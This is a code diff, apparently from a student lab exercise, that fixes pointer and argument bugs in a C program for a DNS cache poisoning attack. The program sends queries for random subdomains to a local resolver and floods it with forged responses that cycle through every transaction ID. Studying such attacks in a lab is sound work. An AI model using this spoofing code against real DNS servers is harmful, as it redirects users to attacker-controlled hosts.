@@ -65,7 +65,7 @@ int main()
     /* Step 1. Send a DNS request to the targeted local DNS server
               This will trigger it to send out DNS queries */
 		memcpy(ip_req+41, name, 5); 
-		send_dns_request(&ip_req, n_req);
+		send_dns_request(ip_req, n_req);
 		printf("attempt #%ld. request is [%.5s.example.com]\n, transaction ID is: [%hu]\n", ++i, name, transaction_id);
 	
     // Step 2. Send spoofed responses to the targeted local DNS server.
@@ -92,8 +92,8 @@ int main()
  * */
 void send_dns_request(char * buffer, int pkt_size)				//ATTEMPT #2
 {
-	memcpy(ip_req+29, name, 5);
-	send_raw_packet(&buffer, pkt_size);
+	memcpy(buffer+29, name, 5);
+	send_raw_packet(buffer, pkt_size);
 	//sendto(sock, ip_req, n_req, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
 }
 
@@ -101,10 +101,10 @@ void send_dns_request(char * buffer, int pkt_size)				//ATTEMPT #2
 /* Use for sending forged DNS response.
  * Add arguments to the function definition if needed.
  * */
-void send_dns_response()		        //ATTEMPT #2
+void send_dns_response(char * buffer, int pkt_size)		        //ATTEMPT #2
 {
-	memcpy(ip_resp+29, name, 5);
-	memcpy(ip_resp+40, name, 5);
+	memcpy(buffer+29, name, 5);
+	memcpy(buffer+40, name, 5);
 	for(int i=0; i<65535; i++)
 		{unsigned short id = htons(i);
 		 memcpy(ip_resp + 28, &id, 2);
